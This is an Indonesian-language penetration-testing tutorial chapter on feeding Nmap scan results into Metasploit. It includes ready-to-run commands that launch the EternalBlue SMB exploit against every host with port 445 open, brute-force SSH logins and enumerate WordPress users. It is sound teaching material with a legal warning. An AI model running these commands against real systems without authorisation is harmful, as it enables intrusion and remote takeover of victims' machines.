# BAB 07 — Nmap + Metasploit Integration

> **NMAP Intermediate Guide · 2026 Edition**

---

## Mengapa Integrasi Nmap + Metasploit?

Nmap unggul dalam **scanning dan enumeration**, sementara Metasploit unggul dalam **exploitation dan post-exploitation**. Mengintegrasikan keduanya memungkinkan workflow pentest yang efisien: scan dulu dengan Nmap, lalu eksplotasi langsung dari Metasploit tanpa scan ulang.

---

## Metode 1: Import XML ke Metasploit (db_import)

### Langkah 1: Scan dengan Nmap, simpan ke XML

```bash
sudo nmap -sS -sV -O -A --open -T4 192.168.1.0/24 -oX scan_result.xml
```

### Langkah 2: Import ke Metasploit

```bash
# Jalankan Metasploit
msfconsole

# Di dalam msfconsole:
msf6 > db_status          # Pastikan database PostgreSQL terhubung
msf6 > workspace -a my_pentest   # Buat workspace baru
msf6 > db_import /path/to/scan_result.xml

# Lihat hasil import
msf6 > hosts              # Daftar host yang ditemukan
msf6 > services           # Daftar layanan yang ditemukan
msf6 > vulns              # Daftar kerentanan (jika ada)
```

### Filter di Metasploit

```bash
# Hanya tampilkan host yang up
msf6 > hosts -u

# Cari host dengan port 445 terbuka
msf6 > services -p 445 -R

# Cari berdasarkan layanan
msf6 > services -s http -R

# Export ulang ke file
msf6 > hosts -o /tmp/hosts.csv
```

---

## Metode 2: Scan dari Dalam Metasploit (db_nmap)

Metasploit bisa menjalankan Nmap langsung dan hasilnya otomatis masuk ke database.

```bash
msf6 > db_nmap -sS -sV -T4 192.168.1.0/24
msf6 > db_nmap -A --open -p 22,80,443,445 192.168.1.0/24

# Semua opsi Nmap berlaku
msf6 > db_nmap -sU -p 161 --script snmp-info 192.168.1.0/24
```

---

## Metode 3: Menggunakan `hosts -R` untuk Set RHOSTS

Setelah import, kamu bisa langsung set RHOSTS dari database:

```bash
# Setelah db_nmap atau db_import:
msf6 > services -p 445 -R
# → Otomatis set RHOSTS ke semua host dengan port 445

msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue) > run
```

---

## Metode 4: Nmap + Metasploit via Nmap Script (NSE)

NSE script `msf-brute` bisa mengirim hasil ke Metasploit secara langsung (perlu konfigurasi):

```bash
# Brute force dan langsung login via Metasploit RPC
nmap --script msf-brute --script-args userdb=users.txt,passdb=pass.txt -p 22 192.168.1.1
```

---

## Workflow Praktis: SMB Vulnerability Check

```bash
# Langkah 1: Scan SMB dengan Nmap
sudo nmap -sS -p 445 --script smb-vuln-ms17-010 192.168.1.0/24 -oX smb_scan.xml

# Langkah 2: Import ke MSF
msfconsole -q
msf6 > db_import smb_scan.xml
msf6 > vulns    # Lihat apakah ada yang vulnerable

# Langkah 3: Eksplotasi
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > services -p 445 -R    # Set RHOSTS
msf6 > set LHOST 192.168.1.100
msf6 > run
```

---

## Workflow Praktis: Web Server Enumeration to Exploitation

```bash
# Langkah 1: Nmap web enumeration
nmap -sV --script "http-enum,http-title,http-headers,http-methods" \
  -p 80,443,8080 192.168.1.0/24 -oX web_scan.xml

# Langkah 2: Import & filter
msf6 > db_import web_scan.xml
msf6 > services -s http   # Lihat semua HTTP services

# Langkah 3: Cek phpMyAdmin / WordPress / dll.
msf6 > search type:exploit platform:php
msf6 > use auxiliary/scanner/http/wordpress_login_enum
msf6 > services -s http -R
msf6 > run
```

---

## Menggunakan Hasil Nmap dengan Auxiliary Scanners MSF

```bash
# Setelah db_nmap scan:
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 > services -p 445 -R    # Set RHOSTS dari database
msf6 > run

# SSH version scanner
msf6 > use auxiliary/scanner/ssh/ssh_version
msf6 > services -p 22 -R
msf6 > run
```

---

## Tips & Best Practices

```bash
# Selalu pakai workspace terpisah per engagement
msf6 > workspace -a client_pentest_2026

# Backup database sebelum import besar
msf6 > db_export -f xml /tmp/backup.xml

# Bersihkan workspace setelah selesai
msf6 > workspace -d client_pentest_2026
```

---

> ⚠️ **Peringatan:** Seluruh aktivitas di bab ini hanya boleh dilakukan pada sistem yang kamu miliki atau telah mendapat izin tertulis. Eksploitasi tanpa izin adalah tindak pidana.

---

*← [BAB 06: Custom NSE Script](bab06.md) · Selanjutnya → [BAB 08: IPv6 Scanning](bab08.md)*
